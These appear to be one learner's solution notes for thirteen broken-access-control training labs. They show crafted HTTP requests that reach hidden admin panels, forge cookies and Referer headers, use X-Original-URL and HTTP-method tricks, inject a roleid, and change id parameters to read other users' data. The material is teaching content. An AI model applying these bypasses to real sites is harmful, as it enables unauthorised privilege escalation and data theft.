## Lab - 1: Unprotected admin functionality

- This lab has an unprotected admin panel. Solve the lab by deleting the user carlos.

- There is an unprotected route at `/administration-panel`

---

## Lab - 2: Unprotected admin functionality with unpredictable URL

- This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

- Solve the lab by accessing the admin panel, and using it to delete the user carlos.

- Found a script that contain admin route.

```html
<script>
  var isAdmin = false;
  if (isAdmin) {
    var topLinksTag = document.getElementsByClassName("top-links")[0];
    var adminPanelTag = document.createElement("a");
    adminPanelTag.setAttribute("href", "/admin-n55l1b");
    adminPanelTag.innerText = "Admin panel";
    topLinksTag.append(adminPanelTag);
    var pTag = document.createElement("p");
    pTag.innerText = "|";
    topLinksTag.appendChild(pTag);
  }
</script>
```

---

## Lab - 3: User role controlled by request parameter

- This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie. Solve the lab by accessing the admin panel and using it to delete the user carlos. You can log in to your own account using the following credentials: wiener:peter

- login with wiener and change the cookie `Admin: false` to `Admin: true`

---

## Lab - 4: User role can be modified in user profile

- This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2. Solve the lab by accessing the admin panel and using it to delete the user carlos. You can log in to your own account using the following credentials: wiener:peter

- this lab is not realistic
- login with wiener. Change the account email and with POST request, add roleid.

```
POST /my-account/change-email HTTP/1.1
...

{"email":"test@test.com",
	"roleid":2
}
```

Then admin panel will appear.

---

## Lab - 5: URL-based access control can be circumvented

- This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

```
GET /?username=carlos HTTP/1.1
Host: 0a80006f04efe538c090448200ea0054.web-security-academy.net
...
Referer: https://0a80006f04efe538c090448200ea0054.web-security-academy.net/
Upgrade-Insecure-Requests: 1
X-Original-URL: /admin/delete
...
```

---

## Lab - 6: Method-based access control can be circumvented

- This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

- To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.

- login as administrator and upgrading the user as admin goes through this route

```
POST /admin-roles HTTP/1.1
...
username=carlos&action=upgrade
```

- Login as wiener from a private browser and copy its session cookie and test the above POST method and return 401 response. If the POST method is changed to POSTX method, `"Missing parameter 'username'"` will be got.

- change the request method and send that request and carlos will be upgraded.

---

## Lab - 7: User ID controlled by request parameter

- This lab has a horizontal privilege escalation vulnerability on the user account page. To solve the lab, obtain the API key for the user carlos and submit it as the solution. You can log in to your own account using the following credentials: wiener:peter

- found one endpoint

```
GET /my-account?id=wiener HTTP/1.1
...
```

- change the `id` parameter value

---

## Lab - 8: User ID controlled by request parameter, with unpredictable user IDs

- found on endpoint with id

```
GET /my-account?id=a45226c1-1fad-41bd-98f4-8452c62c643f HTTP/1.1
...
```

- search for other user's id and found in one blog post

```html
<a href="/blogs?userId=e66a8702-4e90-4082-af18-3849f631b972">carlos</a>
```

---

## Lab - 9: User ID controlled by request parameter with data leakage in redirect

- use Burp repeater and use endpoint `/my-account?id=carlos`
- though it is redirect, in Burp response, it contains API key.

---

## Lab - 10: User ID controlled by request parameter with password disclosure

- This lab has user account page that contains the current user's existing password, prefilled in a masked input. To solve the lab, retrieve the administrator's password, then use it to delete carlos. You can log in to your own account using the following credentials: wiener:peter

- Login with wiener
- password is shown at my-account page
- at `/my-account?id=wiener` change to `/my-account?id=administrator`

---

## Lab - 11: Insecure direct object references

- This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs

- at `/chat` page, download button makes GET request from `/download-transcript/2.txt'

- try to download the `/download-transcript/1.txt`

---

## Lab - 12: Multi-step process with no access control on one step

- This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin. To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.

- Changing the role of admin takes two steps.
- First step,

```
POST /admin-roles HTTP/1.1
...
Referer: https://0ab400af04c9812bc05b131100ad0034.web-security-academy.net/admin
...
username=wiener&action=upgrade
```

- Second step to confirm which is vulnerable

```
POST /admin-roles HTTP/1.1
...
Referer: https://0ab400af04c9812bc05b131100ad0034.web-security-academy.net/admin-roles
...

action=downgrade&confirmed=true&username=wiener
```

---

## Lab - 13: Referer-based access control

- This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin. To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.

- GET request with `wiener` account.

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
...
Referer: https://0a540077039e8eafc08a03c5007300e7.web-security-academy.net/admin
...
```

---
